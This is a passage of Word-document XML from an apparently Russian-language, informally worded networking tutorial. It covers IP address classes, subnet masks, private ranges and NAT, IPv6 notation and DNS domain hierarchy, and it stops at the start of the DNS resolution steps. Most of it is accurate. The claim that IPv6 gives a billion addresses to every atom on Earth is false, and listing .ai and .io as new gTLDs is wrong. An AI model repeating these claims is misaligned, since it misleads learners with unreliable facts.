        <w:t>| D     | 224 – 239               | —                | —                 | Multicast (групповая рассылка) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| E     | 240 – 255               | —                | —                 | Экспериментальные         |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`10.0.0.1` — класс A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`172.16.0.1` — класс B</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`192.168.1.1` — класс C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему "126", а не "127"?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">`127.x.x.x` — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>loopback</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (петля обратной связи). `127.0.0.1` — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>localhost</w:t>
      </w:r>
      <w:r>
        <w:t>, т.е. "я сам" (твой компьютер обращается к себе самому). Полезно для тестирования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему сейчас не используют классы?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Классовая адресация расточительна. Если у тебя сеть класса A (16 млн адресов), но ты используешь только 1000, остальные просто пропадают. Поэтому придумали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CIDR</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Classless Inter-Domain Routing) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>маски подсети</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Маски подсети (Subnet Mask)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Маска подсети</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это 32-битное число, которое </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>разделяет IP-адрес на две части</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевая часть** (Network ID) — идентификатор сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Хостовая часть** (Host ID) — идентификатор конкретного устройства в сети</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Запись:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Маска записывается либо в десятичном виде (`255.255.255.0`), либо в CIDR-нотации (`/24`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>IP-адрес:  192.168.1.100</w:t>
        <w:br/>
        <w:t>Маска:     255.255.255.0  (или /24)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В двоичном виде:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>IP:    11000000.10101000.00000001.01100100</w:t>
        <w:br/>
        <w:t>Mask:  11111111.11111111.11111111.00000000</w:t>
        <w:br/>
        <w:t xml:space="preserve">       ^^^^^^^^ ^^^^^^^^ ^^^^^^^^ ^^^^^^^^</w:t>
        <w:br/>
        <w:t xml:space="preserve">       Сетевая часть (24 бита)   | Хостовая часть (8 бит)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Биты маски, равные `1`, обозначают **сетевую часть**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Биты маски, равные `0`, обозначают **хостовую часть**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CIDR-нотация `/24`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> означает, что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>24 бита</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> отведены под сеть, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>8 бит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — под хосты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Количество хостов в подсети:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если на хосты отведено N бит, количество адресов = 2^N. Но два адреса зарезервированы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Адрес сети** (все биты хостовой части = 0): `192.168.1.0`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Широковещательный адрес** (все биты хостовой части = 1): `192.168.1.255`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формула:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Количество хостов = 2^N - 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Подсеть `/24` (маска `255.255.255.0`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>N = 8 (8 бит на хосты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество хостов = 2⁸ - 2 = 256 - 2 = **254 хоста**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Подсеть `/16` (маска `255.255.0.0`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>N = 16 (16 бит на хосты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество хостов = 2¹⁶ - 2 = 65,536 - 2 = **65,534 хоста**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Подсеть `/30` (маска `255.255.255.252`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>N = 2 (2 бита на хосты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество хостов = 2² - 2 = 4 - 2 = **2 хоста**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Подсеть `/30` часто используют для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>соединения двух роутеров</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (point-to-point link).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Публичные и приватные IP-адреса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Помнишь, мы говорили, что IPv4-адресов не хватает? Решение — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>приватные IP-адреса</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NAT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Network Address Translation).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Приватные IP-адреса</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это диапазоны, которые </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не маршрутизируются в интернете</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (т.е. не видны снаружи). Их можно использовать в локальной сети сколько угодно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Диапазоны приватных адресов (RFC 1918):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Диапазон                      | CIDR          | Количество адресов |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------------------------------|---------------|--------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 10.0.0.0 – 10.255.255.255     | 10.0.0.0/8    | 16,777,216         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 172.16.0.0 – 172.31.255.255   | 172.16.0.0/12 | 1,048,576          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 192.168.0.0 – 192.168.255.255 | 192.168.0.0/16| 65,536             |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Публичные IP-адреса</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это все остальные. Они </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>уникальны в интернете</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и выдаются провайдерами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это работает:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>У тебя дома роутер с **публичным IP** (выдан провайдером): `203.0.113.50`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Твои устройства (компьютер, телефон, умная лампочка) имеют **приватные IP**: `192.168.0.2`, `192.168.0.3`, `192.168.0.4`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Когда ты заходишь на сайт, роутер делает **NAT** (подменяет твой приватный IP на публичный)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Серверу Google кажется, что запрос пришёл с `203.0.113.50`, а не с `192.168.0.2`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NAT (Network Address Translation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это механизм, который позволяет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нескольким устройствам</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в локальной сети </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>использовать один публичный IP-адрес</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы NAT:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Экономия публичных IP-адресов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дополнительная безопасность (устройства внутри сети не видны снаружи)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы NAT:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Усложняет peer-to-peer соединения (например, в онлайн-играх)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нарушает end-to-end connectivity (изначальную идею интернета)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>IPv6: решение проблемы нехватки адресов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IPv6</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это шестая версия IP, которая использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>128 бит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> вместо 32.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Количество адресов:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 2¹²⁸ ≈ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>340 ундециллионов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (340 триллионов триллионов триллионов). Это настолько дохуя, что можно выдать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>миллиард IP-адресов каждому атому на Земле</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>128 бит, разделённые на **8 групп по 16 бит** (4 шестнадцатеричные цифры)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Записывается через двоеточие: `2001:0db8:85a3:0000:0000:8a2e:0370:7334`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сокращения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Убрать ведущие нули:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   `2001:0db8:0001:0000:0000:0000:0000:0001` → `2001:db8:1:0:0:0:0:1`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Заменить последовательность нулей на `::`:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   `2001:db8:1:0:0:0:0:1` → `2001:db8:1::1`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> `::` можно использовать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только один раз</w:t>
      </w:r>
      <w:r>
        <w:t>, иначе непонятно, сколько групп нулей пропущено.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры IPv6:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`::1` — loopback (localhost), аналог `127.0.0.1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`fe80::` — link-local адреса (для локальной сети)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`2001:4860:4860::8888` — публичный DNS от Google</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему IPv6 до сих пор не везде?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Потому что переход на новый протокол — это пиздец. Нужно обновить всё железо, всё ПО, все роутеры. NAT отсрочил проблему на десятилетия, и многие до сих пор живут на IPv4.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.1.2. Доменные имена (DNS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Ок, мы разобрались с IP-адресами. Но блять, кто будет запоминать `142.250.186.46` вместо `google.com`? Никто. Поэтому придумали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DNS (Domain Name System)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это типа телефонная книга интернета.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DNS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это система, которая преобразует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>доменные имена</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (типа `google.com`) в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IP-адреса</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (типа `142.250.186.46`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Иерархия доменов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Доменные имена организованы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>иерархически</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (как дерево).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>subdomain.domain.tld</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓        ↓     ↓</w:t>
        <w:br/>
        <w:t>поддомен  домен  домен верхнего уровня (TLD)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> `mail.google.com`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.                    ← Корневой домен (Root)</w:t>
        <w:br/>
        <w:t>├── com              ← Домен первого уровня (TLD)</w:t>
        <w:br/>
        <w:t>│   ├── google       ← Домен второго уровня</w:t>
        <w:br/>
        <w:t>│   │   ├── mail     ← Поддомен (субдомен)</w:t>
        <w:br/>
        <w:t>│   │   ├── drive</w:t>
        <w:br/>
        <w:t>│   │   └── www</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Полное доменное имя (FQDN — Fully Qualified Domain Name):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>`mail.google.com.` (с точкой в конце, но её обычно опускают)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Типы доменов верхнего уровня (TLD)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Домен верхнего уровня (Top-Level Domain, TLD)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это самая правая часть домена.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы TLD:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**gTLD (Generic TLD)** — общие домены:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.com` — коммерческие организации (но использует кто угодно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.org` — некоммерческие организации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.net` — сетевые ресурсы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.edu` — образовательные учреждения (только в США)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.gov` — правительственные организации США</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.info`, `.biz`, `.online` — всякое разное</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ccTLD (Country Code TLD)** — национальные домены:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.ru` — Россия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.us` — США</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.uk` — Великобритания</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.de` — Германия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.cn` — Китай</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.tv` — Тувалу (но используется для видеосайтов, потому что TV)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Новые gTLD** (с 2013 года):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`.tech`, `.app`, `.dev`, `.blog`, `.cloud`, `.ai`, `.io`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Забавный факт:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Домен `.io` принадлежит Британской территории в Индийском океане, но стал популярен среди IT-стартапов (Input/Output). Домен `.ai` принадлежит острову Ангилья, но используется для AI-компаний.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как работает DNS (резолвинг)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Резолвинг (разрешение имён)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс превращения доменного имени в IP-адрес.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаги:</w:t>
      </w:r>
    </w:p>
    <w:p/>
